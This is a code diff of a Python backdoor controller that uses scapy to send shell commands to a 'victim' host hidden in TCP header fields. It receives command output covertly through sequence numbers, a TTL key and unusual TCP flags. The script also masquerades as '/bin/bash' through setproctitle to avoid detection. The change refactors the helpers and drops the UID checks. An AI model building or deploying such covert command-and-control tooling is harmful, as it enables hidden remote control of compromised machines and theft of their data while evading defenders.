@@ -1,12 +1,11 @@
 #!/usr/bin/python3
 
-import uuid #Used to generate UID's
 import optparse
 import os
 import subprocess
 import sys
 import time
-from bkutil import message_to_bits
+from bkutil import *
 from multiprocessing import Process
 from cryptoutil import encrypt, decrypt
 from scapy.all import *
@@ -29,57 +28,19 @@ setFlag = "E"
 myip=("192.168.0.3",66)
 
 def secret_send(msg:str, type:str='command'):
-    '''
+    """
     Keyword arguments:
     msg      - payload being sent
     type     - file or command (default:command)
-    '''
+    """
     if(type == "command"):
         #Convert message to ASCII to bits
         msg = message_to_bits(msg)
         chunks = message_spliter(msg)
         packets = packatizer(chunks)
-        if(len(packets) == 1):
-            send(packets[0])
-        else:
-            for packet in packets:
-                send(packet)
-                pass
-
-def message_spliter(msg:str):
-    length = 32 #bits in seq #
-    if(len(msg) == length ):
-        output = []
-        output.append(msg)
-        return msg
-    elif(len(msg) <= length):
-        # Pad so that the message is as long as the length
-        msg = msg.zfill(length)
-        return msg
-    #If the message length is greater than what can be stuffed into one packet,
-    #then break it down into multiple chunks
-    elif(len(msg) > length):
-        #Rounds are the amount of packets that can be filled with the data.
-        rounds = int(len(msg) / length)
-        #The excess is what will be left over
-        excess = len(msg) % length
-        #Create the blank array that will hold the data for each packet.
-        output = []
-        #Markers that will be used for traversing the data.
-        i = 0
-        start = 0
-        end = 0
-        # While packets can be completely filled
-        while(i < rounds):
-            start = i*length
-            end = (i*length)+(length - 1) #31
-            output.append(msg[start:end+1])
-            i = i + 1
-        #All the full packets have been created. Now to deal with the excess
-        if(excess > 0):
-            #Add the excess to the output array.
-            output.append(msg[(end+1):(end+1+excess)])
-        return output
+        for packet in packets:
+            send(packet, verbose=False)
+            pass
 
 def packatizer(msg):
     #Create the packets array as a placeholder.
@@ -106,9 +67,8 @@ def packatizer(msg):
     packets.append(IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], flags="U"))
     return packets
 
-def craft(data:str,position:int,total:int,UID:str) -> IP:
+def craft(data:str) -> IP:
     global TTL
-    global authentication
     global setFlag
     #The payload contains the unique password, UID, position number and total.
     packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], \
@@ -128,72 +88,33 @@ def server():
         if(command == "exit"):
             sys.exit()
         else:
-            #Encrypt the command.
-            #encryptedCommand = encrypt(command)
             secret_send(command)
-
-
-def text_from_bits(bits, encoding='utf-8', errors='surrogatepass'):
-    n = int(bits, 2)
-    return n.to_bytes((n.bit_length() + 7) // 8, 'big').decode(encoding, errors) or '\0'
 
 def commandResult(packet):
     global ttlKey
     global args
     global cipher
     global messages
-    srcIP = packet[IP].src
     ttl = packet[IP].ttl
-    if(packet.haslayer(IP)):
-        if(authenticate(packet)):
-            #  we used ord in the client to convert the string character into a Unicoded value
-            #  chr() now encodes the Unicoded value back as a string literal
-            #  the message is stored in the sequence number field of the TCP header
-            # checks if the flag has been set to know it contains the secret results
-            flag = packet['TCP'].flags
-            #  the client set an "Echo" flag to make sure the receiver knows it's truly them
-            if flag == 0x40:
-                field = packet[TCP].seq
-                #print (lengthChecker(field)
-                #Converts the bits to the nearest divisible by 8
-                covertContent = lengthChecker(field)
-                #print(text_from_bits(covertContent))
-                messages.append(text_from_bits(covertContent))
-            #End Flag detected
-            elif flag == 0x20:
-                payload=''.join(messages)
-                print ("The Output: ",payload)
-                messages = []
+    if(packet.haslayer(IP) and ttl == TTLKEY):
+        # checks if the flag has been set to know it contains the secret results
+        flag = packet['TCP'].flags
+        #  the client set an "Echo" flag to make sure the receiver knows it's truly them
+        if flag == 0x40:
+            field = packet[TCP].seq
+            #Converts the bits to the nearest divisible by 8
+            covertContent = lengthChecker(field)
+            messages.append(text_from_bits(covertContent))
+        #End Flag detected
+        elif flag == 0x20:
+            payload=''.join(messages).decode("utf-8")
+            print ("The Output: ",payload)
+            messages = []
     else:
         return
 
-
-def lengthChecker(field):
-    covertContent = 0
-    seqContent = bin(field)[2:]
-    if len(seqContent) < 8:
-        covertContent = bin(field)[2:].zfill(8)
-    elif len(seqContent) > 8 and len(seqContent) < 16:
-        covertContent = bin(field)[2:].zfill(16)
-    elif len(seqContent) > 16 and len(seqContent) < 24:
-        covertContent = bin(field)[2:].zfill(24)
-    elif len(seqContent) > 24 and len(seqContent) < 32:
-        covertContent = bin(field)[2:].zfill(32)
-    else:
-        return seqContent
-    return covertContent
-
-def authenticate(packet):
-    # Check TTL first
-    ttl = packet[IP].ttl
-    # Checks if the ttl matches with ours
-    if ttl == TTLKEY:
-        return True
-    return False
-
 def commandSniffer(threadName, infectedIP): #TODO call fucntion inside thread
     sniff(timeout=10, filter="tcp and host "+victim[0], prn=commandResult)
-
 
 setproctitle.setproctitle("/bin/bash") #set fake process name
 #print(setproctitle.getproctitle())
